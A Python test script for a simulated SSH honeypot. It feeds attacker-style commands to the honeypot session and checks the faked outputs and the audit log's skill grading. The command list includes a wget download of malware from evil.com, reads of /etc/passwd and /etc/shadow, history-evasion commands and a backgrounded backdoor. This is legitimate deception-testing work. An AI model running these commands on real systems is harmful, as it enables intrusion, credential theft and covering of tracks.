import os
import json
import time
from honeypot import HoneypotSession

def run_test():
    print("[*] Starting Honeypot Verification...")
    
    # Cleanup previous logs
    if os.path.exists("honeypot_audit.json"):
        os.remove("honeypot_audit.json")

    session = HoneypotSession(client_ip="192.168.1.100", username="admin")
    
    test_commands = [
        ("whoami", "admin"),
        ("id", "uid=1000(admin)"),
        ("ls", "deploy.sh"), # Should see files from /home/admin
        ("cat /etc/passwd", "root:x:0:0"),
        ("cat /etc/shadow", "Permission denied"),
        ("ps aux", "mysqld"), # Advanced command check
        ("netstat -an", "0.0.0.0:22"),
        ("uptime", "load average"),
        ("sudo whoami", "root"), 
        ("wget http://evil.com/malware", "Saving to: 'index.html'"), 
        ("unset HISTFILE", ""),
        ("export TMOUT=0", ""),
        ("nohup ./backdoor &", "") # Accumulate score to reach > 20
    ]

    failed = False
    for cmd, expected in test_commands:
        print(f"[*] Testing: {cmd}")
        output = session.handle_command(cmd)
        if expected in output:
            print(f"  [+] Passed")
        else:
            print(f"  [-] FAILED. Expected '{expected}' in output:")
            print(f"      Got: {output.strip()}")
            failed = True

    # Check Logs
    print("[*] Verifying Logs...")
    if not os.path.exists("honeypot_audit.json"):
        print("  [-] No log file found!")
        failed = True
    else:
        with open("honeypot_audit.json", "r") as f:
            logs = [json.loads(line) for line in f]
        
        print(f"  [+] Found {len(logs)} log entries.")
        
        # Check skill detection
        high_skill_entry = next((l for l in logs if "nohup" in l["command"]["raw_input"]), None)
        if high_skill_entry:
            skill = high_skill_entry["behavior_analysis"]["skill_level"]
            print(f"  [+] Skill Level for 'nohup': {skill}")
            if skill == "High":
                print("  [+] Dynamic Deception Engine: Verified (High usage detected)")
            else:
                print("  [-] Dynamic Deception Engine: Failed (Did not detect High skill)")
        else:
            print("  [-] Could not find log entry for 'nohup'")
            failed = True

    if failed:
        print("\n[-] Verification FAILED.")
    else:
        print("\n[+] Verification SUCCESSFUL.")

if __name__ == "__main__":
    run_test()
